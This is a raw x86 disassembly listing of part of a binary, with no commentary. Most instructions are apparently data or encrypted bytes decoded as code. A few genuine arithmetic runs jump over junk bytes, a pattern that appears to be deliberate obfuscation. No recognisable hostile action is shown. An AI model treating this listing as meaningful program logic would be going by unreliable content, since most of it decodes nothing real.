  401991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401992:	(bad)  
  401993:	pop    eax
  401994:	sub    ebp,ecx
  401996:	in     eax,dx
  401997:	das    
  401998:	out    0x0,al
  40199a:	rol    BYTE PTR [ebx],0x8b
  40199d:	pushf  
  40199e:	cmp    BYTE PTR [esi],bh
  4019a0:	sub    bh,BYTE PTR [eax]
  4019a2:	mov    eax,0x9f0c629a
  4019a7:	or     DWORD PTR [edx],edx
  4019a9:	mov    bl,0xaa
  4019ab:	cwde   
  4019ac:	mov    BYTE PTR cs:[esi],bh
  4019af:	pop    edi
  4019b0:	jns    0x40196c
  4019b2:	clc    
  4019b3:	in     al,0x52
  4019b5:	and    cl,ch
  4019b7:	add    edi,DWORD PTR [esi-0x2af9331d]
  4019bd:	loopne 0x40199f
  4019bf:	cmp    DWORD PTR [eax-0x54edacff],edi
  4019c5:	xchg   edx,edx
  4019c7:	mov    edi,0xe831de19
  4019cc:	enter  0xbe49,0xef
  4019d0:	out    0x68,eax
  4019d2:	mov    cl,0xda
  4019d4:	pop    ebx
  4019d5:	pop    esi
  4019d6:	stc    
  4019d7:	dec    edx
  4019d8:	jns    0x40197c
  4019da:	mov    esi,0x82e8c447
  4019df:	je     0x4019f8
  4019e1:	stc    
  4019e2:	sar    cl,0x81
  4019e5:	test   BYTE PTR [ecx],ah
  4019e7:	mov    ds:0xf175ef8e,al
  4019ec:	pop    edi
  4019ed:	mov    esp,0xbfce3d4e
  4019f2:	sbb    cl,BYTE PTR [edx+0x271fc54a]
  4019f8:	in     al,0xe6
  4019fa:	mov    eax,ds:0x56612d8d
  4019ff:	and    BYTE PTR ds:[edx],dl
  401a02:	dec    ebp
  401a03:	pop    es
  401a04:	push   0x6f
  401a06:	test   dh,dh
  401a08:	jne    0x4019f6
  401a0a:	(bad)  
  401a0b:	fnstenv [ebp-0x19]
  401a0e:	les    eax,FWORD PTR [ecx-0x2da2f78e]
  401a14:	push   edi
  401a15:	jle    0x401a18
  401a17:	or     al,0xf8
  401a19:	jne    0x4019ec
  401a1b:	xchg   ecx,eax
  401a1c:	je     0x401a23
  401a1e:	push   edi
  401a1f:	jecxz  0x401a33
  401a21:	mov    eax,0x3028680d
  401a26:	xchg   DWORD PTR [edi-0x6d],edx
  401a29:	jecxz  0x401a18
  401a2b:	push   ss
  401a2c:	ret    
  401a2d:	add    al,0x5f
  401a2f:	in     eax,0x5
  401a31:	pop    ds
  401a32:	aaa    
  401a33:	aam    0x75
  401a35:	into   
  401a36:	add    al,0x3c
  401a38:	push   eax
  401a39:	mov    edi,0x3f6c6c70
  401a3e:	and    DWORD PTR [ebp+0x33dbd3d2],esp
  401a44:	jb     0x401ab2
  401a46:	mov    ch,0x61
  401a48:	cmp    DWORD PTR [edx+ebx*2],ebx
  401a4b:	stc    
  401a4c:	sbb    DWORD PTR [ebx],ebp
  401a4e:	inc    ebx
  401a4f:	adc    eax,0x14
  401a52:	xchg   ecx,eax
  401a53:	mov    edi,0xba821dbc
  401a58:	ds push eax
  401a5a:	push   edx
  401a5b:	out    dx,al
  401a5c:	jecxz  0x401a39
  401a5e:	psubq  mm6,mm2
  401a61:	sar    BYTE PTR [esi],cl
  401a63:	jmp    0x401a7a
  401a65:	test   al,0x79
  401a67:	punpckldq mm1,DWORD PTR [ebx+0x15]
  401a6b:	adc    ebx,esi
  401a6d:	adc    ebp,DWORD PTR [ebp+0x54]
  401a70:	fwait
  401a71:	lods   al,BYTE PTR ds:[esi]
  401a72:	out    dx,eax
  401a73:	sub    bh,dl
  401a75:	inc    ecx
  401a76:	and    BYTE PTR [ecx-0x63164fa3],cl
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	imul   ebx,DWORD PTR [edi],0x26
  401a8e:	addr16 push cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a5e
  401a98:	ja     0x401ab9
  401a9a:	mov    al,BYTE PTR [edx]
  401a9c:	or     al,0x77
  401a9e:	pop    ss
  401a9f:	ja     0x401aad
  401aa1:	mov    ?,WORD PTR [edi]
  401aa3:	cmp    al,0x50
  401aa5:	add    dh,BYTE PTR [ebx+0xb]
  401aa8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  401aaa:	push   0xffffffc4
  401aac:	mov    eax,DWORD PTR [eax+eiz*2+0x5d]
  401ab0:	in     al,dx
  401ab1:	rcr    BYTE PTR [edi+0x71],1
  401ab4:	mov    cl,0x58
  401ab6:	loope  0x401ac7
  401ab8:	div    BYTE PTR [eax-0xa]
  401abb:	inc    esp
  401abc:	mov    edi,0xdb0e1300
  401ac1:	push   0x963487a4
  401ac6:	pop    ebp
  401ac7:	ror    ebx,1
  401ac9:	daa    
  401aca:	xor    eax,0x48f75dfd
  401acf:	add    eax,0x7d3f399a
  401ad4:	add    ecx,esi
  401ad6:	cdq    
  401ad7:	test   DWORD PTR [ebx-0x60],esp
  401ada:	mov    ebp,eax
  401adc:	or     cl,BYTE PTR [ebx+0x55]
  401adf:	in     eax,dx
  401ae0:	add    eax,0x9db9ca2c
  401ae5:	daa    
  401ae6:	jmp    0x306c7695
  401aeb:	gs fsubr st(4),st
  401aee:	popa   
  401aef:	pushf  
  401af0:	or     BYTE PTR [eax-0x6],cl
  401af3:	and    al,0xf2
  401af5:	xchg   esp,eax
  401af6:	sbb    ebx,0xcb161ec
  401afc:	pusha  
  401afd:	xor    DWORD PTR [edx+0x2b42d87f],ecx
  401b03:	mov    eax,ds:0x3d23f3e9
  401b08:	(bad)  
  401b09:	fwait
  401b0a:	pop    ecx
  401b0b:	mov    ecx,0xd918155d
  401b10:	xchg   ebx,eax
  401b11:	pop    ss
  401b12:	jns    0x401a94
  401b14:	neg    DWORD PTR [edi]
  401b16:	out    0x42,eax
  401b18:	cmp    bh,0x7e
  401b1b:	out    0xa7,al
  401b1d:	pop    ebx
  401b1e:	mov    eax,0x4e0ea050
  401b23:	ret    
  401b24:	or     al,0xfb
  401b26:	cwde   
  401b27:	mov    ds:0x55f515f9,al
  401b2c:	pop    ds
  401b2d:	mov    cl,0x66
  401b2f:	inc    ecx
  401b30:	push   ebx
  401b31:	pop    edx
  401b32:	cwde   
  401b33:	push   esi
  401b34:	idiv   DWORD PTR [edx+0xa5955ad]
  401b3a:	xor    dh,BYTE PTR [esi+0x62921cdf]
  401b40:	iret   
  401b41:	mov    al,0xe7
  401b43:	jmp    0x2b82:0x573911e6
  401b4a:	retf   
  401b4b:	and    BYTE PTR [esi+0x2d555a42],0x4e
  401b52:	sbb    bl,BYTE PTR [edi-0x577d9c7]
  401b58:	adc    edi,edx
  401b5a:	jae    0x401afe
  401b5c:	daa    
  401b5d:	mov    DWORD PTR [edx-0x311f5fbd],edi
  401b63:	and    DWORD PTR [edi],ebx
  401b65:	das    
  401b66:	ret    
  401b67:	fs scas eax,DWORD PTR es:[edi]
  401b69:	inc    eax
  401b6a:	inc    esi
  401b6b:	inc    esp
  401b6c:	(bad)  
  401b6d:	(bad)  
  401b6f:	lock xchg edi,eax
  401b72:	xchg   BYTE PTR [edi+0x61473577],dh
  401b78:	xchg   edi,eax
  401b79:	ja     0x401b35
  401b7b:	int    0x10
  401b7d:	jo     0x401b62
  401b7f:	inc    esi
  401b80:	ss push ecx
  401b82:	add    eax,DWORD PTR [eax+0x7f28f332]
  401b88:	sub    al,dl
  401b8a:	cmp    esp,esi
  401b8c:	jle    0x401beb
  401b8e:	cs inc esi
  401b90:	xchg   edi,eax
  401b91:	sub    ch,BYTE PTR [esi]
  401b93:	fwait
  401b94:	or     ebx,0xffffff87
  401b97:	jmp    0xcc2bc41e
  401b9c:	add    eax,0x4ed0c07b
  401ba1:	retf   
  401ba2:	cdq    
  401ba3:	enter  0xdce4,0x5e
  401ba7:	jo     0x401b60
  401ba9:	fst    QWORD PTR [esi-0x61]
  401bac:	push   0xffffffdf
  401bae:	mov    al,0x86
  401bb0:	scas   al,BYTE PTR es:[edi]
  401bb1:	outs   dx,BYTE PTR ds:[esi]
  401bb2:	add    eax,0x3130eb83
  401bb7:	fnstsw WORD PTR [eax+0x27]
  401bba:	fsub   QWORD PTR [ebx-0x7d]
  401bbd:	mov    bl,0x7
  401bbf:	data16 (bad) 
  401bc1:	adc    esp,eax
  401bc3:	mov    dh,0x56
  401bc5:	xor    BYTE PTR [edx-0x669a3000],0x14
  401bcc:	ins    DWORD PTR es:[edi],dx
  401bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bce:	ja     0x401b52
  401bd0:	sbb    DWORD PTR [edi+0x2b480aa8],eax
  401bd6:	or     eax,eax
  401bd8:	sub    ebp,esi
  401bda:	fs (bad) 
  401bdc:	ds inc ebx
  401bde:	push   esi
  401bdf:	addr16 pushf 
  401be1:	sub    esp,esi
  401be3:	aas    
  401be4:	sbb    bl,BYTE PTR [ebx+ebx*4]
  401be7:	pop    ebp
  401be8:	retf   0xe233
  401beb:	js     0x401bdc
  401bed:	enter  0x5c00,0xb1
  401bf1:	and    dl,BYTE PTR [ecx]
  401bf3:	xor    eax,0xe7ca2a5c
  401bf8:	(bad)  
  401bf9:	hlt    
  401bfa:	mov    esi,0x3aca4d12
  401bff:	sub    DWORD PTR [edx],ebp
  401c01:	or     al,0x36
  401c03:	pop    edi
  401c04:	sbb    dh,BYTE PTR [esi+0x47]
  401c07:	fst    DWORD PTR [edi]
  401c09:	rcl    BYTE PTR [edi+0x8],cl
  401c0c:	int    0x88
  401c0e:	lock mov WORD PTR [edx+edx*8],cs
  401c12:	aad    0x38
  401c14:	xor    ebx,esp
  401c16:	inc    eax
  401c17:	add    ah,dl
  401c19:	inc    edi
  401c1a:	xchg   edx,eax
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	repz pushf 
  401c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c43:	mov    bh,0x8a
  401c45:	jns    0x401cc5
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c58
  401c4d:	sbb    ebx,esi
  401c4f:	pop    eax
  401c50:	inc    eax
  401c51:	iret   
  401c52:	sub    al,0xd5
  401c54:	loop   0x401c95
  401c56:	inc    ecx
  401c57:	pop    ds
  401c58:	jl     0x401c04
  401c5a:	mov    ah,0xf8
  401c5c:	popf   
  401c5d:	ja     0x401cc3
  401c5f:	nop
  401c60:	push   ds
  401c61:	jmp    0x3c22aaa3
  401c66:	out    dx,al
  401c67:	pop    esi
  401c68:	shl    BYTE PTR [ecx-0x53fb6f92],0xb6
  401c6f:	jmp    0xffaa:0x7d56e1dc
  401c76:	aam    0xdf
  401c78:	lock jp 0x401c37
  401c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c7c:	dec    edx
  401c7d:	dec    eax
  401c7e:	sar    BYTE PTR ds:0x5f0825e2,cl
  401c84:	aam    0x50
  401c86:	and    eax,0xec753d84
  401c8b:	clc    
  401c8c:	mov    ah,0xe2
  401c8e:	or     eax,0x6914a2d5
  401c93:	or     al,0x28
  401c95:	sub    BYTE PTR [ecx-0x20],0xb1
  401c99:	popa   
  401c9a:	push   ebp
  401c9b:	mov    eax,ds:0xdb296fb
  401ca0:	retf   
  401ca1:	mov    ah,0xd9
  401ca3:	mov    ebx,0xad4d095e
  401ca8:	dec    BYTE PTR [eax+0x18f3a6c4]
  401cae:	adc    BYTE PTR [ebp+eax*1-0x523e85e0],dl
  401cb5:	mov    ebp,DWORD PTR [edi-0x6c]
  401cb8:	jb     0x401cb3
  401cba:	sub    ch,BYTE PTR [edx+0xa46c6ae]
  401cc0:	ja     0x401d11
  401cc2:	pop    ebp
  401cc3:	in     al,0xa3
  401cc5:	mov    cl,0xe0
  401cc7:	fwait
  401cc8:	test   DWORD PTR [edx+0x753e3d61],0x1fad823
  401cd2:	rcr    DWORD PTR [eax+0x1733cf5a],1
  401cd8:	in     eax,dx
  401cd9:	dec    esp
  401cda:	test   DWORD PTR [edx+0x4dc404dc],ebp
  401ce0:	call   0x715f:0xf5e05065
  401ce7:	push   ss
  401ce8:	jp     0x401cd6
  401cea:	inc    BYTE PTR [ecx-0x77422497]
  401cf0:	lds    ebp,FWORD PTR [edx]
  401cf2:	mov    al,0x24
  401cf4:	push   cs
  401cf5:	ret    
  401cf6:	xor    eax,0x5a41df57
  401cfb:	xor    esi,eax
  401cfd:	lods   eax,DWORD PTR ds:[esi]
  401cfe:	lods   al,BYTE PTR ds:[esi]
  401cff:	add    al,0x9
  401d01:	add    ebx,ebx
  401d03:	cmp    eax,0x7aa099ca
  401d08:	mov    bl,0xea
  401d0a:	sar    BYTE PTR [edi-0x40],0xbe
  401d0e:	mov    edx,0x8c39a9b6
  401d13:	pop    ss
  401d14:	adc    eax,0x6021a5d6
  401d19:	(bad)  
  401d1a:	out    dx,al
  401d1b:	inc    edi
  401d1c:	and    DWORD PTR [ebx+0x29],ecx
  401d1f:	(bad)  
  401d20:	in     al,0xec
  401d22:	push   edx
  401d23:	scas   al,BYTE PTR es:[edi]
  401d24:	push   ecx
  401d25:	sbb    cl,ch
  401d27:	sti    
  401d28:	inc    edi
  401d29:	adc    al,0x96
  401d2b:	scas   al,BYTE PTR es:[edi]
  401d2c:	ret    0x1437
  401d2f:	ret    0xb078
  401d32:	mov    BYTE PTR [ebx-0x38],ah
  401d35:	shl    BYTE PTR [ebx+0x6f],cl
  401d38:	xor    al,0xc9
  401d3a:	aaa    
  401d3b:	repz jle 0x401cd8
  401d3e:	stos   DWORD PTR es:[edi],eax
  401d3f:	sbb    ch,BYTE PTR [ebx-0x5f3114]
  401d45:	inc    BYTE PTR gs:[edi-0x61]
  401d49:	out    0x77,al
  401d4b:	mov    ds:0xecea4173,eax
  401d51:	push   edi
  401d52:	addr16 sbb eax,0xe779dc61
  401d58:	stc    
  401d59:	push   ds
  401d5a:	and    bl,BYTE PTR [esi]
  401d5c:	repnz sub esp,ebx
  401d5f:	inc    eax
  401d60:	push   esi
  401d61:	sahf   
  401d62:	jns    0x401d7e
  401d64:	push   edx
  401d65:	arpl   WORD PTR [esi-0x13cf076f],bx
  401d6b:	jge    0x401db6
  401d6d:	repz sbb al,0x7f
  401d70:	in     eax,dx
  401d71:	adc    DWORD PTR ds:0x83de2919,edi
  401d77:	(bad)  
  401d78:	gs out 0xe1,eax
  401d7b:	mov    bh,0xc0
  401d7d:	xchg   ebx,eax
  401d7e:	pop    ebx
  401d7f:	pop    ds
  401d80:	mov    al,0xda
  401d82:	jbe    0x401d5b
  401d84:	lods   eax,DWORD PTR ds:[esi]
  401d85:	add    bl,BYTE PTR [ebx+0x56]
  401d88:	jnp    0x401ded
  401d8a:	add    eax,0xaf0d387b
  401d8f:	hlt    
  401d90:	xchg   DWORD PTR [edi+0x53],esp
  401d93:	pusha  
  401d94:	ja     0x401de5
  401d96:	ror    DWORD PTR [eax],0x78
  401d99:	inc    ecx
  401d9a:	rol    BYTE PTR [ecx+0x19],0xb4
  401d9e:	retf   0xf9ad
  401da1:	mov    al,ds:0xd0559b8d
  401da6:	daa    
  401da7:	imul   esp,ecx,0xb80076a
  401dad:	loop   0x401dde
  401daf:	adc    ch,BYTE PTR [ebx-0xd958e2]
  401db5:	inc    ebp
  401db6:	cmp    DWORD PTR ds:0xf63fa157,0x49
  401dbd:	jo     0x401e20
  401dbf:	or     DWORD PTR [ecx+0x42d7e1fb],0xffffffc1
  401dc6:	or     eax,0xfffffff9
  401dc9:	mov    ds:0xac1528da,eax
  401dce:	pop    ds
  401dcf:	stc    
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x13112338],ebp
  401e0d:	or     eax,0x7e7e0716
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e83
  401e17:	and    BYTE PTR [edx+0x2e],al
  401e1a:	pop    ecx
  401e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e1d:	dec    edi
  401e1e:	repz jmp 0x401e93
  401e21:	aam    0x9b
  401e23:	push   eax
  401e24:	adc    al,ch
  401e26:	push   0x390291ff
  401e2b:	jns    0x401e2e
  401e2d:	out    0xf7,al
  401e2f:	sbb    al,0xcc
  401e31:	jnp    0x401e47
  401e33:	dec    esp
  401e34:	mov    bh,BYTE PTR [esi-0x2ade6b75]
  401e3a:	xchg   edx,eax
  401e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e3c:	sbb    eax,0x4e44dca0
  401e41:	jbe    0x401e39
  401e43:	push   0xcc12d70c
  401e48:	mov    edi,0x1501fe3c
  401e4d:	mov    esp,0x4954d0e2
  401e52:	push   esp
  401e53:	jmp    0x401e17
  401e55:	xchg   edi,eax
  401e56:	in     eax,dx
  401e57:	loop   0x401e7c
  401e59:	add    ah,BYTE PTR ds:0x1f7eb08d
  401e5f:	lods   al,BYTE PTR ds:[esi]
  401e60:	ins    DWORD PTR es:[edi],dx
  401e61:	pop    ss
  401e62:	call   0x9942:0x2cf3a0fb
  401e69:	inc    edx
  401e6a:	pop    ebp
  401e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e6c:	rcl    bl,0x6d
  401e6f:	sub    DWORD PTR [edx],0xffffffe0
  401e72:	adc    eax,0xd33465ed
  401e77:	jl     0x401e4f
  401e79:	add    ebx,DWORD PTR [edx-0x31fad005]
  401e7f:	enter  0x8fdf,0xc
  401e83:	jo     0x401e30
  401e85:	lods   al,BYTE PTR ds:[esi]
  401e86:	jmp    0x2a55:0x92dc37b5
  401e8d:	jmp    0x401ea5
  401e8f:	and    DWORD PTR [ecx],ebp
  401e91:	or     eax,0x8a23ce3a
  401e96:	push   cs
  401e97:	call   0xbfbf:0x442c4bbe
  401e9e:	add    al,0x68
  401ea0:	cmp    eax,0x20253d26
  401ea5:	pop    ss
  401ea6:	dec    eax
  401ea7:	fwait
  401ea8:	mov    eax,ds:0xd55b9478
  401ead:	sub    al,0xef
  401eaf:	pop    ds
  401eb0:	loope  0x401e57
  401eb2:	pop    ebx
  401eb3:	jmp    0xe853b96f
  401eb8:	push   edi
  401eb9:	dec    edx
  401eba:	jle    0x401efb
  401ebc:	adc    eax,0xedecdd2d
  401ec1:	mov    edx,0x2814b6c
  401ec6:	jg     0x401ef3
  401ec8:	inc    ebx
  401ec9:	dec    edx
  401eca:	add    al,ch
  401ecc:	bound  esp,QWORD PTR [ebp-0x70448cae]
  401ed2:	xchg   edx,eax
  401ed3:	in     al,0x91
  401ed5:	enter  0x5fa,0x21
  401ed9:	add    edi,DWORD PTR [bx+0xc40]
  401ede:	dec    eax
  401edf:	add    DWORD PTR [edi-0xa8934a6],0xffffffd5
  401ee6:	(bad)  
  401ee7:	repz leave 
  401ee9:	dec    edi
  401eea:	stos   DWORD PTR es:[edi],eax
  401eeb:	popa   
  401eec:	(bad)  
  401eee:	jo     0x401e73
  401ef0:	xchg   ecx,eax
  401ef1:	sahf   
  401ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ef3:	mov    al,ds:0xdee8791d
  401ef8:	retf   
  401ef9:	pop    edi
  401efa:	test   eax,0xa2f74ad4
  401eff:	sahf   
  401f00:	mov    ah,0x7
  401f02:	mov    ecx,0x530e7a70
  401f07:	or     eax,0xb5dd12b4
  401f0c:	repnz test DWORD PTR [ebx+eiz*4-0x6],0x9f52e6a
  401f15:	xor    dh,dl
  401f17:	mov    ds:0x7e35259b,al
  401f1c:	sbb    eax,0xd8e3cc3c
  401f21:	loope  0x401f89
  401f23:	pop    ecx
  401f24:	mov    esp,0xfc5e84cf
  401f29:	and    BYTE PTR [edi-0x886f5a5],dh
  401f2f:	xchg   BYTE PTR [eax-0x49],bl
  401f32:	push   es
  401f33:	jge    0x401ee9
  401f35:	xchg   edi,eax
  401f36:	adc    BYTE PTR [edi-0x39],0xd0
  401f3a:	ds dec edi
  401f3c:	in     al,dx
  401f3d:	mov    bh,0x1f
  401f3f:	inc    esp
  401f40:	bound  ebx,QWORD PTR [ebx-0x24a5dc9a]
  401f46:	push   ebx
  401f47:	adc    ecx,DWORD PTR [ebx]
  401f49:	bound  esi,QWORD PTR cs:[ebx]
  401f4c:	loope  0x401fc8
  401f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f4f:	add    DWORD PTR [edx+0x40],0xffffffd0
  401f53:	xchg   DWORD PTR [ecx+0x6a],ebx
  401f56:	aam    0xd
  401f58:	jl     0x401fa4
  401f5a:	in     eax,0x8b
  401f5c:	mov    ?,WORD PTR [ebp+0x61c002ba]
  401f62:	mov    DWORD PTR [edi-0x5a653999],esi
  401f68:	js     0x401f48
  401f6a:	or     al,0x3b
  401f6c:	fisttp WORD PTR [esp+esi*1]
  401f6f:	pop    edi
  401f70:	(bad)  [ecx-0x564bc917]
  401f76:	(bad)  
  401f77:	rcl    dh,0xe5
  401f7a:	pop    ss
  401f7b:	sbb    ecx,DWORD PTR [ebp+0x533ec56]
  401f81:	cli    
  401f82:	dec    edi
  401f83:	bound  edx,QWORD PTR [eax-0xe98c03b]
  401f89:	lahf   
  401f8a:	mov    ebx,0xd89f5d4d
  401f8f:	add    bh,bl
  401f91:	mov    edi,0xc23c0ca5
  401f96:	aad    0xbd
  401f98:	out    0x8c,al
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xa0655047
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f94
  401fcc:	jb     0x40200e
  401fce:	pop    ds
  401fcf:	mov    cs,eax
  401fd1:	test   BYTE PTR [ecx-0x9],al
  401fd4:	cld    
  401fd5:	shl    DWORD PTR [ecx],cl
  401fd7:	pop    esi
  401fd8:	or     eax,0x85df1a91
  401fdd:	hlt    
  401fde:	pop    edx
  401fdf:	nop
  401fe0:	jle    0x401f72
  401fe2:	or     dl,BYTE PTR ds:0x3e513f34
  401fe8:	adc    cl,BYTE PTR [eax+eiz*2-0x7ceda98]
  401fef:	cmp    ebx,DWORD PTR [ebx]
  401ff1:	or     dl,bh
  401ff3:	fist   WORD PTR [ebx]
  401ff5:	rcr    DWORD PTR [edx+ebp*8+0x101d2822],cl
  401ffc:	jp     0x401fc5
  401ffe:	out    0xf8,eax
  402000:	push   esi
  402001:	sbb    ah,cl
  402003:	das    
  402004:	pop    ebx
  402005:	stc    
  402006:	sub    al,0xcd
  402008:	sbb    al,0xc2
  40200a:	jmp    0x8568d0f3
  40200f:	pop    edi
  402010:	nop
  402011:	lahf   
  402012:	xchg   edx,eax
  402013:	cmp    al,0x66
  402015:	pop    edi
  402016:	pop    edx
  402017:	jb     0x40201a
  402019:	push   ebx
  40201a:	and    al,0x34
  40201c:	push   0x51
  40201e:	push   es
  40201f:	in     al,dx
  402020:	xchg   ecx,eax
  402021:	sub    al,0x14
  402023:	mov    ds:0xb715c536,al
  402028:	or     ah,dl
  40202a:	rcl    BYTE PTR [edi+0x4ea0b71],cl
  402030:	das    
  402031:	push   0xfa4e4209
  402036:	adc    BYTE PTR [edi-0x67],dh
  402039:	inc    edx
  40203a:	loopne 0x402005
  40203c:	pop    esp
  40203d:	push   ds
  40203e:	xchg   esi,eax
  40203f:	stos   BYTE PTR es:[edi],al
  402040:	in     al,0xb5
  402042:	sar    BYTE PTR [esi+0x69],1
  402045:	add    esp,0xb24b57a6
  40204b:	fldcw  WORD PTR [ecx+eax*4-0x26]
  40204f:	mov    al,ds:0x341b7cf7
  402054:	push   edi
  402055:	ret    0x4312
  402058:	sub    DWORD PTR [edx-0x8489966],0x73
  40205f:	fldl2t 
  402061:	xor    eax,0xb738fce0
  402066:	rcl    DWORD PTR [edx+0x1e],0xc5
  40206a:	les    edi,FWORD PTR [eax+0xaa6db24]
  402070:	dec    eax
  402071:	loopne 0x4020dc
  402073:	repz cmc 
  402075:	jne    0x4020f3
  402077:	test   eax,0xa5171a14
  40207c:	aam    0xdf
  40207e:	mov    al,0xa3
  402080:	aad    0xad
  402082:	pop    eax
  402083:	xor    ecx,eax
  402085:	pushf  
  402086:	leave  
  402087:	push   ebp
  402088:	xchg   ebx,eax
  402089:	pop    esi
  40208a:	adc    al,0xe3
  40208c:	mov    ah,0xf1
  40208e:	dec    edx
  40208f:	cld    
  402090:	push   edi
  402091:	mov    eax,0xf28101c1
  402096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402097:	pop    eax
  402098:	(bad)  
  402099:	loopne 0x4020d2
  40209b:	cdq    
  40209c:	(bad)  
  40209d:	and    eax,0xc473d333
  4020a2:	lods   al,BYTE PTR ds:[esi]
  4020a3:	inc    eax
  4020a4:	shl    BYTE PTR [esi],1
  4020a6:	dec    ebp
  4020a7:	and    dl,BYTE PTR [edi]
  4020a9:	test   eax,0x887f99bb
  4020ae:	retf   0x3b19
  4020b1:	fsubr  DWORD PTR [ebx*2+0x79ca4dac]
  4020b8:	sar    DWORD PTR [ebp+ebx*4+0x155f9b3b],0x5a
  4020c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020c1:	(bad)  
  4020c2:	xlat   BYTE PTR ds:[ebx]
  4020c3:	or     ecx,DWORD PTR [edi-0x79]
  4020c6:	scas   al,BYTE PTR es:[edi]
  4020c7:	push   cs
  4020c8:	sbb    dl,al
  4020ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020cb:	lods   al,BYTE PTR ds:[esi]
  4020cc:	rol    DWORD PTR [ebx+0x1c],cl
  4020cf:	xchg   esi,eax
  4020d0:	cmp    al,0x15
  4020d2:	imul   esi,DWORD PTR [edi-0x1b],0xc5a1967c
  4020d9:	pop    edx
  4020da:	mov    ch,0xf4
  4020dc:	and    BYTE PTR [esi+edi*1-0x6b4d5593],ah
  4020e3:	(bad)  
  4020e4:	fiadd  DWORD PTR [ebp+esi*8-0x5]
  4020e8:	jno    0x402075
  4020ea:	jl     0x402110
  4020ec:	sub    DWORD PTR [ebx+0x76],eax
  4020ef:	(bad)  
  4020f0:	popf   
  4020f1:	(bad)  
  4020f2:	pop    ebx
  4020f3:	push   esi
  4020f4:	pop    edi
  4020f5:	push   ss
  4020f6:	pop    ebp
  4020f7:	xor    BYTE PTR [eax+0x1c],dl
  4020fa:	cld    
  4020fb:	dec    edi
  4020fc:	ja     0x4020ca
  4020fe:	dec    ecx
  4020ff:	push   eax
  402100:	cli    
  402101:	fs inc ebp
  402103:	lahf   
  402104:	and    BYTE PTR [eax+0x2e453d4b],bl
  40210a:	or     cl,BYTE PTR [esi+0x58]
  40210d:	test   al,0x3d
  40210f:	xchg   edx,eax
  402110:	mov    esi,0x54e8df33
  402115:	mov    ecx,0x40e3ea6
  40211a:	or     eax,0x3d686a7c
  40211f:	out    dx,al
  402120:	mov    ebp,0x31a73bab
  402125:	mov    ebx,edi
  402127:	popa   
  402128:	or     al,0xe8
  40212a:	pop    ds
  40212b:	xchg   edi,eax
  40212c:	fadd   QWORD PTR [edi]
  40212e:	adc    al,0x89
  402130:	and    DWORD PTR [ebx+esi*8+0x21],edi
  402134:	bnd jne 0x4020ee
  402137:	pop    ebx
  402138:	scas   al,BYTE PTR es:[edi]
  402139:	jp     0x402172
  40213b:	xor    BYTE PTR [eax-0x1a],ah
  40213e:	out    0xa6,eax
  402140:	cdq    
  402141:	adc    eax,0x71d3be68
  402146:	adc    ebp,DWORD PTR [ecx+ebx*2]
  402149:	stos   DWORD PTR es:[edi],eax
  40214a:	shr    DWORD PTR [ecx-0x80],cl
  40214d:	inc    BYTE PTR [esi-0x17ba74b0]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
